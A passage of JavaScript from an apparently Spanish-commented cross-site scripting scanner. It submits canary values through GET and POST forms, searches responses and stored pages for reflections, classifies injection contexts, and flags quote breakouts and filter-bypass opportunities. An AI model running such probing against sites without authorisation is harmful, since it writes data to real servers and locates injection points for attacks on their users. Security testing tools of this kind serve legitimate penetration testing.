      const iframeFound = iframeTestVectors.reduce((a, v) => a + (vectorReflectionMap.has(v) ? vectorReflectionMap.get(v).length : 0), 0);
      if (iframeFound > 0) {
        ns.log.info(`   %c📊 Iframe detection found ${iframeFound} new DOM reflection(s)!`, 'color:#ff00ff;font-weight:bold');
      }
    }

    // -- 2a+. SUBMIT GET FORMS via fetch -> buscar reflejo en respuesta --
    // Para reflected XSS clasico: form GET -> servidor refleja el valor.
    // Sin submit, el canary solo esta en el input value y nunca sale de ahi.
    const formReflections = [];
    const inputVectorsWithForms = vectors.filter(v => v.type === 'input' && v.element?.form);

    if (inputVectorsWithForms.length > 0) {
      const formMap = new Map();
      for (const v of inputVectorsWithForms) {
        const form = v.element.form;
        if (!formMap.has(form)) formMap.set(form, []);
        formMap.get(form).push(v);
      }

      for (const [form, formVectors] of formMap) {
        const method = (form.method || 'GET').toUpperCase();
        if (method !== 'GET') {
          // POST forms are handled separately below
          continue;
        }

        // Construir URL: usar canary en inputs editables, originales en hidden (csrf etc.)
        const actionUrl = new URL(form.action || location.href, location.href);
        const formInputs = form.querySelectorAll('input[name], textarea[name], select[name]');
        for (const inp of formInputs) {
          if (inp.type === 'hidden' || inp.type === 'submit') {
            // Restaurar valor original para que el servidor acepte la peticion
            const vec = formVectors.find(fv => fv.element === inp);
            actionUrl.searchParams.set(inp.name, vec?.originalValue || inp.defaultValue || inp.value || '');
          } else {
            // Input editable -> usar el canary ya inyectado
            actionUrl.searchParams.set(inp.name, inp.value || '');
          }
        }

        ns.log.info(`   \uD83D\uDD04 Fetching GET form \u2192 %c${truncate(actionUrl.toString(), 120)}`, 'color:#888');

        try {
          const resp = await fetch(actionUrl.toString(), {
            credentials: 'same-origin',
            headers: { 'Accept': 'text/html' },
          });
          if (!resp.ok) {
            ns.log.info(`   \u26A0\uFE0F HTTP ${resp.status}`);
            continue;
          }
          const html = await resp.text();
          ns.log.info(`   \uD83D\uDCC4 Response: ${html.length} bytes`);

          for (const v of formVectors) {
            if (!html.includes(v.canary.base)) {
              ns.log.info(`   \u274C Canary %c${v.canary.base}%c (${v.name}) no encontrado`, 'color:#888', 'color:#ccc');
              continue;
            }
            ns.log.info(`   \u2705 Canary %c${v.canary.base}%c (${v.name}) encontrado en respuesta`, 'color:#00ff00', 'color:#ccc');

            // Buscar TODAS las ocurrencias en el HTML raw
            let searchFrom = 0;
            let occNum = 0;
            while (searchFrom < html.length) {
              const idx = html.indexOf(v.canary.base, searchFrom);
              if (idx === -1) break;
              searchFrom = idx + v.canary.base.length;
              occNum++;

              const ctxStart = Math.max(0, idx - 300);
              const ctxEnd = Math.min(html.length, idx + v.canary.full.length + 300);
              const surrounding = html.substring(ctxStart, ctxEnd);
              const fullMatch = html.substring(idx, Math.min(html.length, idx + v.canary.full.length + 100));

              const anal = analyzeReflection(v.canary, fullMatch, surrounding);

              // Detectar contexto via HTML raw
              const beforeCanary = html.substring(ctxStart, idx);
              let ctx = 'html-body';
              let attrNameFinal = null;
              let tagName = '?';

              const lastOpenTag = beforeCanary.lastIndexOf('<');
              const lastCloseTag = beforeCanary.lastIndexOf('>');

              if (lastOpenTag > lastCloseTag) {
                // DENTRO de un tag abierto
                const tagContent = beforeCanary.substring(lastOpenTag);
                const tagNameMatch = tagContent.match(/^<(\w+)/);
                tagName = tagNameMatch ? tagNameMatch[1].toLowerCase() : '?';

                const dqCount = (tagContent.match(/"/g) || []).length;
                const sqCount = (tagContent.match(/'/g) || []).length;

                // Atributo mas cercano al canary
                const attrMatch = tagContent.match(/([\w-]+)\s*=\s*["']?[^"'<>]*$/);
                attrNameFinal = attrMatch ? attrMatch[1].toLowerCase() : null;
                // Fallback: nested quotes in event handler values break the primary regex
                if (!attrNameFinal) {
                  const onFallback = [...tagContent.matchAll(/\b(on\w+)\s*=/gi)];
                  if (onFallback.length > 0) attrNameFinal = onFallback[onFallback.length - 1][1].toLowerCase();
                }

                if (['href', 'src', 'action', 'formaction', 'data', 'srcdoc', 'codebase'].includes(attrNameFinal)) {
                  ctx = 'html-attr-href';
                } else if (attrNameFinal && attrNameFinal.startsWith('on')) {
                  ctx = 'html-attr-event';
                } else if (dqCount % 2 === 1) {
                  ctx = 'html-attr-dq';
                } else if (sqCount % 2 === 1) {
                  ctx = 'html-attr-sq';
                } else {
                  ctx = attrNameFinal ? 'html-attr-uq' : 'html-body';
                }

                // Breakout detection
                if (ctx === 'html-attr-dq' && anal.survived.includes('"')) {
                  ns.log.info(`      %c\u26A1 BREAKOUT: " rompe atributo ${attrNameFinal || '?'}`, 'color:#ff0000;font-weight:bold');
                }
                if (ctx === 'html-attr-sq' && anal.survived.includes("'")) {
                  ns.log.info(`      %c\u26A1 BREAKOUT: ' rompe atributo ${attrNameFinal || '?'}`, 'color:#ff0000;font-weight:bold');
                }
              } else {
                // Dentro de <script>?
                const lastScript = beforeCanary.lastIndexOf('<script');
                const lastScriptEnd = beforeCanary.lastIndexOf('</script');
                if (lastScript > -1 && lastScript > lastScriptEnd) {
                  const jsContent = beforeCanary.substring(lastScript);
                  const dq = (jsContent.match(/"/g) || []).length;
                  const sq = (jsContent.match(/'/g) || []).length;
                  const bt = (jsContent.match(/`/g) || []).length;
                  if (bt % 2 === 1) ctx = 'js-template';
                  else if (sq % 2 === 1) ctx = 'js-string-sq';
                  else if (dq % 2 === 1) ctx = 'js-string-dq';
                  else ctx = 'js-code';
                } else {
                  ctx = 'html-body';
                  const tm = beforeCanary.match(/<(\w+)[^>]*>[^<]*$/);
                  tagName = tm ? tm[1].toLowerCase() : 'body';
                }
              }

              const elemDesc = attrNameFinal ? `<${tagName} ${attrNameFinal}="\u2026">` : `<${tagName}>`;
              ns.log.info(`      \uD83D\uDCCD #${occNum}: %c${ctx}%c en ${elemDesc}`, 'color:#ff00ff;font-weight:bold', 'color:#ccc');
              ns.log.info(`         Raw: %c${anal.survived.join(' ') || '(ninguno)'}`, 'color:#00ff00');
              if (anal.encoded.length) ns.log.info(`         Encoded: %c${anal.encoded.join(' ')}`, 'color:#ffaa00');
              if (anal.partiallyEncoded && anal.partiallyEncoded.length > 0) {
                ns.log.info(`         %c⚡ Partial encoding detected: ${anal.partiallyEncoded.join(' ')} — first occurrence encoded, subsequent raw!`, 'color:#ff6600;font-weight:bold');
                ns.log.info(`         💡 Sacrificial prefix bypass viable: prepend ${anal.partiallyEncoded.map(c => `"${c}"`).join(', ')} to consume first replace()`);
              }

              formReflections.push({
                type: attrNameFinal ? 'attribute' : 'text',
                context: ctx, attrName: attrNameFinal, element: elemDesc,
                rawSample: truncate(fullMatch, 200),
                analysis: anal,
                suggestions: suggestPayloads(ctx, anal.survived),
                domElement: null,
                sourceVector: v,
                sourceName: `INPUT [${v.name}] \u2192 form GET`,
                formAction: actionUrl.toString(),
                isFormReflection: true,
              });
            }
          }
        } catch (e) {
          ns.log.info(`   \u26A0\uFE0F Error fetching form: ${e.message}`);
        }
      }

      // Deduplicate form reflections: keep only one per (source, element) pair
      // to avoid testing the same reflection point in different "contexts" caused
      // by unreliable quote-counting heuristics in <script> blocks
      const seenFormKeys = new Set();
      const dedupedFormReflections = [];
      for (const fr of formReflections) {
        const key = `${fr.sourceName}::${fr.element}`;
        if (seenFormKeys.has(key)) continue;
        seenFormKeys.add(key);
        dedupedFormReflections.push(fr);
      }

      if (dedupedFormReflections.length > 0) {
        reflections = [...reflections, ...dedupedFormReflections];
        ns.log.info(`   %c\uD83D\uDCE8 ${dedupedFormReflections.length} reflejo(s) via GET form${dedupedFormReflections.length < formReflections.length ? ` (${formReflections.length - dedupedFormReflections.length} duplicates removed)` : ''}`, 'color:#ff6600;font-weight:bold');
      } else {
        const hasGetForms = [...formMap.keys()].some(f => (f.method || 'GET').toUpperCase() === 'GET');
        if (hasGetForms) {
          ns.log.info(`   \uD83D\uDCE8 0 reflejos via GET form`);
        }
      }

      // -- POST forms (single submission with unique canary per field) --
      for (const [form, formVectors] of formMap) {
        const method = (form.method || 'GET').toUpperCase();
        if (method !== 'POST') continue;

        const actionUrl = new URL(form.action || location.href, location.href);
        const allInputs = form.querySelectorAll('input[name], textarea[name], select[name]');
        const editableInputs = [...allInputs].filter(inp =>
          inp.type !== 'hidden' && inp.type !== 'submit' &&
          inp.type !== 'checkbox' && inp.type !== 'radio' && inp.type !== 'file'
        );
        if (editableInputs.length === 0) continue;

        ns.log.info(`\n   %c\uD83D\uDCDD POST form: ${editableInputs.length} editable field(s) \u2192 ${truncate(actionUrl.toString(), 80)}`, 'color:#ff6600;font-weight:bold');

        // Build original values map from vectors (captured before Phase 1 canary injection)
        const origValueMap = new Map();
        for (const fv of formVectors) {
          if (fv.element?.name) origValueMap.set(fv.element.name, fv.originalValue || '');
        }
        // Fallback: for hidden fields not in vectors, use current value from the DOM
        // (handles JS-rotated CSRF tokens; falls back to defaultValue if value is empty)
        for (const inp of allInputs) {
          if (inp.type === 'hidden' && inp.name && !origValueMap.has(inp.name)) {
            origValueMap.set(inp.name, inp.value || inp.defaultValue || '');
          }
        }

        // STEP 1: Assign unique canary to each editable field
        const fieldCanaryMap = new Map(); // fieldName -> { canary, input, vector, shaped }
        for (const inp of editableInputs) {
          const fieldName = inp.name || '?';
          const canary = generateCanary();
          const sv = formVectors.find(fv => fv.element === inp);
          const canaryVal = getCanaryValue(canary, inp);
          const shaped = canaryVal !== canary.full; // true for URL/email-shaped canaries
          fieldCanaryMap.set(fieldName, { canary, input: inp, vector: sv || null, shaped });
          ns.log.info(`      \uD83D\uDD11 %c${fieldName}%c \u2192 canary %c${canary.base}%c${shaped ? ' (URL/email shaped)' : ''}`, 'color:#00ddff;font-weight:bold', 'color:#ccc', 'color:#888', 'color:#666');
        }

        // STEP 2: Fill form — canaries in editable fields, originals/fillers elsewhere
        for (const inp of allInputs) {
          if (inp.type === 'submit' || inp.type === 'file') continue;
          const fieldEntry = fieldCanaryMap.get(inp.name);
          if (fieldEntry) {
            inp.value = getCanaryValue(fieldEntry.canary, inp);
          } else {
            // Hidden/non-editable: restore original value or use filler
            const origVal = origValueMap.get(inp.name);
            if (origVal !== undefined && origVal !== '') {
              inp.value = origVal;
            } else {
              inp.value = inp.defaultValue || getFillerValue(inp);
            }
          }
        }

        // STEP 3: Submit form via fetch (more reliable than iframe for stored XSS)
        const origFormTarget = form.target || '';
        let submitIframe = null;
        try {
          // Primary: submit via fetch (handles redirects, avoids X-Frame-Options issues)
          const formData = new FormData(form);
          // Debug: log form fields being sent
          const fdEntries = [...formData.entries()].map(([k, v]) => `${k}=${truncate(String(v), 30)}`);
          ns.log.info(`      📋 ${fdEntries.length} field(s): ${fdEntries.join(', ')}`);
          let postResponseHtml = null;
          let postRedirectUrl = null;
          try {
            const postResp = await fetch(actionUrl.toString(), {
              method: 'POST',
              body: new URLSearchParams(formData),
              credentials: 'same-origin',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              redirect: 'follow',
            });
            postResponseHtml = await postResp.text();
            postRedirectUrl = postResp.url;
            ns.log.info(`      📮 POST ${postResp.status} → ${truncate(postResp.url, 100)}`);
          } catch (e) {
            ns.log.debug(` fetch POST failed: ${e.message}, falling back to iframe submit`);
            // Fallback: submit via iframe
            const iframeName = `__domxss_post_${Date.now()}`;
            submitIframe = document.createElement('iframe');
            submitIframe.name = iframeName;
            submitIframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
            document.body.appendChild(submitIframe);
            form.target = iframeName;
            const submitDone = new Promise(resolve => {
              submitIframe.onload = () => resolve(true);
              submitIframe.onerror = () => resolve(false);
              setTimeout(() => resolve(false), CONFIG.delays.longTimeout);
            });
            form.submit();
            await submitDone;
            try {
              if (submitIframe.contentDocument) {
                postResponseHtml = submitIframe.contentDocument.documentElement.outerHTML;
              }
            } catch (e) { ns.log.debug(e.message); }
          }

          // STEP 4: Collect HTML sources to scan for canaries
          const htmlSources = [];

          // Source 1: POST response (direct or redirect target)
          if (postResponseHtml) {
            htmlSources.push({ html: postResponseHtml, label: `${postRedirectUrl ? 'POST redirect' : 'POST response'} (${postResponseHtml.length} bytes)` });
          }

          // Source 2: stored XSS — fetch the view page (the page we're currently on)
          // Wait for the server to process the stored comment
          let viewHtml = null;
          await new Promise(r => setTimeout(r, CONFIG.delays.betweenTests));
          try {
            const viewResp = await fetch(location.href, {
              credentials: 'same-origin',
              headers: { 'Accept': 'text/html', 'Cache-Control': 'no-cache' },
              cache: 'reload',
            });
            if (viewResp.ok) {
              viewHtml = await viewResp.text();
              htmlSources.push({ html: viewHtml, label: `stored (view page) ${viewResp.status}` });
            } else {
              ns.log.info(`      ⚠️ View page fetch failed: ${viewResp.status}`);
            }
          } catch (e) { ns.log.info(`      ⚠️ View page fetch error: ${e.message}`); }

          // Source 3: if the POST redirected to a different URL, also try fetching
          // the original page with cache bypass (comment may appear there)
          if (postRedirectUrl && postRedirectUrl !== location.href) {
            try {
              const redirResp = await fetch(postRedirectUrl, {
                credentials: 'same-origin',
                headers: { 'Accept': 'text/html', 'Cache-Control': 'no-cache' },
                cache: 'reload',
              });
              if (redirResp.ok) {
                const redirHtml = await redirResp.text();
                htmlSources.push({ html: redirHtml, label: 'stored (redirect target)' });
              }
            } catch (e) { ns.log.debug(e.message); }
          }

          // Source 5: Stored DOM XSS — fetch form action URL as GET
          // Apps commonly use the same endpoint for POST (submit) and GET (retrieve).
          // E.g., POST /post/comment stores it, GET /post/comment?postId=X returns comments.
          const csrfLikeNames = /csrf|token|nonce|verification|viewstate|_method|honeypot|utf8/i;
          try {
            const getUrl = new URL(actionUrl.toString());
            for (const [k, v] of new URL(location.href).searchParams) {
              if (!getUrl.searchParams.has(k)) getUrl.searchParams.set(k, v);
            }
            // Also add non-CSRF hidden field values as query params
            // (covers sites where ID is only in hidden fields, not in URL)
            for (const inp of allInputs) {
              if (inp.type === 'hidden' && inp.name && !getUrl.searchParams.has(inp.name)) {
                if (!csrfLikeNames.test(inp.name)) {
                  getUrl.searchParams.set(inp.name, inp.value || inp.defaultValue || '');
                }
              }
            }
            const getResp = await fetch(getUrl.toString(), {
              credentials: 'same-origin',
              headers: { 'Accept': '*/*', 'Cache-Control': 'no-cache' },
              cache: 'reload',
            });
            if (getResp.ok) {
              const getText = await getResp.text();
              if (getText.length > 0) {
                htmlSources.push({ html: getText, label: `stored (GET ${getUrl.pathname}) ${getResp.status}` });
              }
            }
          } catch (e) { ns.log.debug(e.message); }

          // Canary bases for checking all remaining sources
          const anyCanaryBase = [...fieldCanaryMap.values()].map(fc => fc.canary.base);

          // Source 6: Script mining — discover AJAX endpoints from page scripts
          // Catches Stored DOM XSS where comments are loaded via JS from a different endpoint
          if (viewHtml && !htmlSources.some(s => anyCanaryBase.some(b => s.html.includes(b)))) {
            const ajaxUrls = new Set();
            const scriptTexts = [];
            // Inline scripts
            for (const m of viewHtml.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/gi)) {
              if (m[1].trim()) scriptTexts.push(m[1]);
            }
            // External same-origin scripts
            for (const m of viewHtml.matchAll(/<script[^>]+src=["']([^"']+)["']/gi)) {
              try {
                const sUrl = new URL(m[1], location.href);
                if (sUrl.origin === location.origin) {
                  const sResp = await fetch(sUrl.toString(), { credentials: 'same-origin' });
                  if (sResp.ok) scriptTexts.push(await sResp.text());
                }
              } catch (e) {}
            }
            // Parse scripts for AJAX endpoints
            for (const js of scriptTexts) {
              for (const m of js.matchAll(/fetch\s*\(\s*['"`]([^'"`\s]+?)['"`]/g)) ajaxUrls.add(m[1]);
              for (const m of js.matchAll(/\.open\s*\(\s*['"`]GET['"`]\s*,\s*['"`]([^'"`\s]+?)['"`]/g)) ajaxUrls.add(m[1]);
              for (const m of js.matchAll(/\$\.(?:get|getJSON|ajax)\s*\(\s*['"`]([^'"`\s]+?)['"`]/g)) ajaxUrls.add(m[1]);
              // Function calls with path-like args: loadComments('/post/comment')
              for (const m of js.matchAll(/\w+\s*\(\s*['"`](\/[^'"`\s]+?)['"`]\s*[,)]/g)) ajaxUrls.add(m[1]);
            }
            // Fetch discovered endpoints (same-origin only, with page params)
            for (const rawUrl of ajaxUrls) {
              try {
                const url = new URL(rawUrl, location.href);
                if (url.origin !== location.origin) continue;
                for (const [k, v] of new URL(location.href).searchParams) {
                  if (!url.searchParams.has(k)) url.searchParams.set(k, v);
                }
                const resp = await fetch(url.toString(), {
                  credentials: 'same-origin',
                  headers: { 'Accept': '*/*', 'Cache-Control': 'no-cache' },
                  cache: 'reload',
                });
                if (resp.ok) {
                  const text = await resp.text();
                  if (text.length > 0) {
                    htmlSources.push({ html: text, label: `AJAX ${url.pathname} ${resp.status}` });
                    if (anyCanaryBase.some(b => text.includes(b))) break; // Found it, stop mining
                  }
                }
              } catch (e) {}
            }
            if (ajaxUrls.size > 0) {
              ns.log.info(`      🔍 Script mining: ${ajaxUrls.size} AJAX endpoint(s) discovered`);
            }
          }

          // Source 7: retry the view page if nothing found yet (race condition workaround)
          const alreadyFound = htmlSources.some(s => anyCanaryBase.some(b => s.html.includes(b)));
          if (!alreadyFound) {
            await new Promise(r => setTimeout(r, CONFIG.delays.retryWait));
            try {
              const retryResp = await fetch(location.href, {
                credentials: 'same-origin',
                headers: { 'Accept': 'text/html', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache' },
                cache: 'no-store',
              });
              if (retryResp.ok) {
                const retryHtml = await retryResp.text();
                if (anyCanaryBase.some(b => retryHtml.includes(b))) {
                  htmlSources.push({ html: retryHtml, label: 'stored (retry)' });
                  ns.log.debug(` Canary found on retry (delayed storage)`);
                }
              }
            } catch (e) { ns.log.debug(e.message); }
          }

          // Diagnostic: log collected HTML sources
          ns.log.info(`      📄 ${htmlSources.length} HTML source(s):`);
          for (const { html, label } of htmlSources) {
            const found = anyCanaryBase.filter(b => html.includes(b));
            ns.log.info(`         ${found.length > 0 ? '✅' : '⚪'} ${label} — ${html.length} bytes${found.length > 0 ? `, canary: ${found.join(', ')}` : ''}`);
          }

          if (htmlSources.length === 0) {
            ns.log.info(`      \u274C Could not read response`);
            continue;
          }

          // STEP 5: For each HTML source, scan for ALL canaries and map to fields
          let anyFound = false;
          for (const { html, label } of htmlSources) {
            for (const [fieldName, { canary, input, vector, shaped }] of fieldCanaryMap) {
              if (!html.includes(canary.base)) continue;

              anyFound = true;
              // Find all occurrences — collect ALL unique contexts per field per source
              const contextMap = new Map(); // ctx → reflection (dedup by context)

              let searchFrom = 0;
              while (searchFrom < html.length) {
                const idx = html.indexOf(canary.base, searchFrom);
                if (idx === -1) break;
                searchFrom = idx + canary.base.length;

                const ctxStart = Math.max(0, idx - 300);
                const ctxEnd = Math.min(html.length, idx + canary.full.length + 300);
                const surrounding = html.substring(ctxStart, ctxEnd);
                const fullMatch = html.substring(idx, Math.min(html.length, idx + canary.full.length + 100));

                // For shaped canaries (URL/email), probe chars weren't injected —
                // assume all chars survive since we can't test them individually.
                // Phase 3 will verify with actual payloads.
                let anal;
                if (shaped) {
                  const allChars = Object.keys(PROBE_CHARS);
                  anal = { survived: [...allChars], encoded: [], stripped: [], encodings: {} };
                  for (const ch of allChars) anal.encodings[ch] = 'assumed (shaped canary)';
                } else {
                  anal = analyzeReflection(canary, fullMatch, surrounding);
                }

                const beforeCanary = html.substring(ctxStart, idx);
                let ctx = 'html-body';
                let attrNameFinal = null;
                let tagName = '?';
                const lastOpenTag = beforeCanary.lastIndexOf('<');
                const lastCloseTag = beforeCanary.lastIndexOf('>');
                if (lastOpenTag > lastCloseTag) {
                  const tagContent = beforeCanary.substring(lastOpenTag);
                  const tagNameMatch = tagContent.match(/^<(\w+)/);
                  tagName = tagNameMatch ? tagNameMatch[1].toLowerCase() : '?';
                  const dqCount = (tagContent.match(/"/g) || []).length;
                  const sqCount = (tagContent.match(/'/g) || []).length;
                  const attrMatch = tagContent.match(/([\w-]+)\s*=\s*["']?[^"'<>]*$/);
                  attrNameFinal = attrMatch ? attrMatch[1].toLowerCase() : null;
                  // Fallback: nested quotes in event handler values break the primary regex
                  if (!attrNameFinal) {
                    const onFallback = [...tagContent.matchAll(/\b(on\w+)\s*=/gi)];
                    if (onFallback.length > 0) attrNameFinal = onFallback[onFallback.length - 1][1].toLowerCase();
                  }
                  if (['href', 'src', 'action', 'formaction', 'data', 'srcdoc', 'codebase'].includes(attrNameFinal)) {
                    ctx = 'html-attr-href';
                  } else if (attrNameFinal && attrNameFinal.startsWith('on')) {
                    ctx = 'html-attr-event';
                  } else if (dqCount % 2 === 1) {
                    ctx = 'html-attr-dq';
                  } else if (sqCount % 2 === 1) {
                    ctx = 'html-attr-sq';
                  } else {
                    ctx = attrNameFinal ? 'html-attr-uq' : 'html-body';
                  }
                } else {
                  const lastScript = beforeCanary.lastIndexOf('<script');
                  const lastScriptEnd = beforeCanary.lastIndexOf('</script');
                  if (lastScript > -1 && lastScript > lastScriptEnd) {
                    const jsContent = beforeCanary.substring(lastScript);
                    const dq = (jsContent.match(/"/g) || []).length;
                    const sq = (jsContent.match(/'/g) || []).length;
                    const bt = (jsContent.match(/`/g) || []).length;
                    if (bt % 2 === 1) ctx = 'js-template';
                    else if (sq % 2 === 1) ctx = 'js-string-sq';
                    else if (dq % 2 === 1) ctx = 'js-string-dq';
                    else ctx = 'js-code';
                  }
                }

                // Keep best reflection per unique context (higher priority occurrence wins within same ctx)
                let ctxPri = 1;
                if (ctx === 'html-attr-href' || ctx === 'js-url') ctxPri = 10;
                else if (ctx === 'html-attr-event') ctxPri = 8;
                else if (ctx.startsWith('js-')) ctxPri = 7;
                else if (ctx.startsWith('html-attr')) ctxPri = 5;

                if (!contextMap.has(ctx)) {
                  const elemDesc = attrNameFinal ? `<${tagName} ${attrNameFinal}="\u2026">` : `<${tagName}>`;
                  contextMap.set(ctx, {
                    priority: ctxPri,
                    reflection: {
                      type: attrNameFinal ? 'attribute' : 'text',
                      context: ctx, attrName: attrNameFinal, element: elemDesc,
                      rawSample: truncate(fullMatch, 200),
                      analysis: anal,
                      suggestions: suggestPayloads(ctx, anal.survived),
                      domElement: null,
                      sourceVector: vector,
                      sourceName: `INPUT [${fieldName}] \u2192 form POST`,
                      formAction: actionUrl.toString(),
                      formMethod: 'POST',
                      isFormReflection: true,
                      isStoredXSS: label.includes('stored'),
                    },
                  });
                }
              }

              // Sort by priority (highest first) and add ALL unique contexts
              const sortedContexts = [...contextMap.entries()]
                .sort((a, b) => b[1].priority - a[1].priority);

              for (const [ctx, { priority, reflection }] of sortedContexts) {
                // Dedup: skip if we already have this field+context from another source
                const dedupKey = `POST::${fieldName}::${ctx}`;
                if (seenFormKeys.has(dedupKey)) continue;
                seenFormKeys.add(dedupKey);

                const isStored = label.includes('stored');
                let badge = '';
                if (ctx === 'html-attr-href' || ctx === 'js-url') badge = '\uD83D\uDEA8 HIGH';
                else if (ctx === 'html-attr-event' || ctx.startsWith('js-')) badge = '\u26A0\uFE0F MED';
                const storedTag = isStored ? ' (STORED)' : '';

                ns.log.info(`      %c\u2705 ${fieldName}%c \u2192 %c${ctx}%c in ${reflection.element}${storedTag} ${badge}`,
                  'color:#00ddff;font-weight:bold', 'color:#ccc', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
                ns.log.info(`         Raw: %c${reflection.analysis.survived.join(' ') || '(none)'}`, 'color:#00ff00');
                if (reflection.analysis.encoded.length) {
                  ns.log.info(`         Encoded: %c${reflection.analysis.encoded.join(' ')}`, 'color:#ffaa00');
                }
                if (reflection.analysis.partiallyEncoded && reflection.analysis.partiallyEncoded.length > 0) {
                  ns.log.info(`         %c⚡ Partial encoding detected: ${reflection.analysis.partiallyEncoded.join(' ')} — first occurrence encoded, subsequent raw!`, 'color:#ff6600;font-weight:bold');
                  ns.log.info(`         💡 Sacrificial prefix bypass viable: prepend ${reflection.analysis.partiallyEncoded.map(c => `"${c}"`).join(', ')} to consume first replace()`);
                }

                formReflections.push(reflection);
                reflections.push(reflection);
              }
            }
          }

          if (!anyFound) {
            ns.log.info(`      \u274C No canaries reflected in ${htmlSources.length} source(s)`);
            // Show confirmation page snippet to help diagnose server rejection
            if (postResponseHtml) {
              const titleMatch = postResponseHtml.match(/<title[^>]*>([^<]+)<\/title>/i);
              const title = titleMatch ? titleMatch[1].trim() : '';
              ns.log.info(`      📄 Confirmation: "${title || truncate(postResponseHtml.replace(/<[^>]+>/g, ' ').trim(), 80)}"`);
            }
          } else {
            const postCount = formReflections.length - dedupedFormReflections.length;
            if (postCount > 0) {
              ns.log.info(`   %c\uD83D\uDCE8 ${postCount} unique field(s) reflected via POST`, 'color:#ff6600;font-weight:bold');
            }
          }
        } catch (e) {
          ns.log.info(`      \u26A0\uFE0F Error: ${e.message}`);
        } finally {
          form.target = origFormTarget;
          if (submitIframe && submitIframe.parentNode) {
            try { submitIframe.parentNode.removeChild(submitIframe); } catch (e) { ns.log.debug(e.message); }
          }
        }
      }
    }

    // -- 2b. Pre-scan de URL params originales (para DOM XSS via location.search) --
    // replaceState no re-ejecuta JS -> el canary de URL params nunca llega al sink.
    // Buscamos los valores originales de cada param en el DOM.
    const urlReflections = [];
    // Atributos sink -- para valores cortos solo buscamos en estos (evita falsos positivos)
    const SINK_ATTRS = new Set(['href', 'src', 'action', 'formaction', 'data', 'srcdoc', 'codebase', 'cite', 'background', 'poster', 'ping']);

    if (savedOriginalParams.length > 0) {
      for (const [paramName, paramVal] of savedOriginalParams) {
        if (!paramVal) continue;
        if (paramName === '__xss_test' || paramName === '__xss_probe') continue;
        // Para valores muy cortos (1-3 chars), solo buscar en atributos sink
        const shortValue = paramVal.length <= 3;

        // Buscar en atributos
        const selector = shortValue ? 'a[href], [src], [action], [formaction], [data], [srcdoc]' : '*';
        document.querySelectorAll(selector).forEach(el => {
          if (injectedInputs.has(el)) return;
          for (const attr of el.attributes || []) {
            // Para valores cortos, solo verificar atributos sink (href, src, etc.)
            if (shortValue && !SINK_ATTRS.has(attr.name.toLowerCase())) continue;
            if (!attr.value.includes(paramVal)) continue;
            // Ya capturado?
            if (reflections.some(r => r.domElement === el && r.attrName === attr.name)) continue;

            const rawHTML = el.outerHTML.substring(0, 500);
            const ctx = detectReflectionContext(el, attr.name, rawHTML);
            const allChars = Object.keys(PROBE_CHARS);
            const dummyAnalysis = { survived: allChars, encoded: [], stripped: [], encodings: {} };
            // Marcar encoding real de lo que hay en el atributo
            for (const ch of allChars) {
              if (attr.value.includes(ch)) { dummyAnalysis.encodings[ch] = 'none (raw)'; }
              else {
                let found = false;
                for (const [encType, patterns] of Object.entries(ENCODING_PATTERNS)) {
                  if (patterns[ch]) {
                    for (const enc of patterns[ch]) {
                      if (rawHTML.includes(enc)) {
                        dummyAnalysis.encoded.push(ch);
                        dummyAnalysis.survived = dummyAnalysis.survived.filter(c => c !== ch);
                        dummyAnalysis.encodings[ch] = `${encType}: ${enc}`;
                        found = true; break;
                      }
                    }
                  }
                  if (found) break;
                }
                if (!found) {
                  dummyAnalysis.stripped.push(ch);
                  dummyAnalysis.survived = dummyAnalysis.survived.filter(c => c !== ch);
                  dummyAnalysis.encodings[ch] = 'STRIPPED/FILTERED';
                }
              }
            }

            const sourceVector = vectors.find(v => v.type === 'url-param' && v.param === paramName);
            urlReflections.push({
              type: 'attribute', context: ctx, attrName: attr.name,
              element: `<${el.tagName.toLowerCase()} ${attr.name}="\u2026">`,
              rawSample: truncate(attr.value, 200),
              analysis: dummyAnalysis,
              suggestions: suggestPayloads(ctx, dummyAnalysis.survived),
              domElement: el,
              paramName, paramVal,
              sourceVector,
              sourceName: `URL ?${paramName}=`,
            });
          }
        });

        // Buscar en texto
        const walker = document.createTreeWalker(document.body || document.documentElement, NodeFilter.SHOW_TEXT, null);
        let node;
        while (node = walker.nextNode()) {
          if (!node.textContent.includes(paramVal)) continue;
          const parent = node.parentElement;
          if (!parent || injectedInputs.has(parent)) continue;
          if (reflections.some(r => r.domElement === parent)) continue;

          const rawHTML = parent.innerHTML || '';
          const ctx = detectReflectionContext(parent, null, rawHTML, rawHTML.indexOf(paramVal));
          const allChars = Object.keys(PROBE_CHARS);
          const dummyAnalysis = { survived: [...allChars], encoded: [], stripped: [], encodings: {} };

          const sourceVector = vectors.find(v => v.type === 'url-param' && v.param === paramName);
          urlReflections.push({
            type: 'text', context: ctx,
            element: `<${parent.tagName.toLowerCase()}>`,
            rawSample: truncate(node.textContent, 200),
            analysis: dummyAnalysis,
            suggestions: suggestPayloads(ctx, dummyAnalysis.survived),
            domElement: parent,
            paramName, paramVal,
            sourceVector,
            sourceName: `URL ?${paramName}=`,
          });
        }
      }

      if (urlReflections.length > 0) {
        reflections = [...reflections, ...urlReflections];
      }
    }

    // -- 2c. Buscar valor ORIGINAL de cada input reflejado en el DOM --
    // Si el JS de la pagina ya corrio en page load y hizo input.value -> sink,
    // el canary nuevo NO llega al sink. Pero el valor original SI esta ahi.
    const inputReflections = [];
    const inputVectors = vectors.filter(v => v.type === 'input' && v.originalValue && v.originalValue.length >= 2);

    if (inputVectors.length > 0) {
      for (const v of inputVectors) {
        const origVal = v.originalValue;
        const inputEl = v.element;

        // Buscar en atributos
        document.querySelectorAll('*').forEach(el => {
          if (el === inputEl) return; // no el mismo input
          if (injectedInputs.has(el)) return;
          for (const attr of el.attributes || []) {
            if (!attr.value.includes(origVal)) continue;
            if (reflections.some(r => r.domElement === el && r.attrName === attr.name)) continue;

            const rawHTML = el.outerHTML.substring(0, 500);
            const ctx = detectReflectionContext(el, attr.name, rawHTML);
            const allChars = Object.keys(PROBE_CHARS);
            const analysis = { survived: [...allChars], encoded: [], stripped: [], encodings: {} };

            inputReflections.push({
              type: 'attribute', context: ctx, attrName: attr.name,
              element: `<${el.tagName.toLowerCase()} ${attr.name}="\u2026">`,
              rawSample: truncate(attr.value, 200),
              analysis,
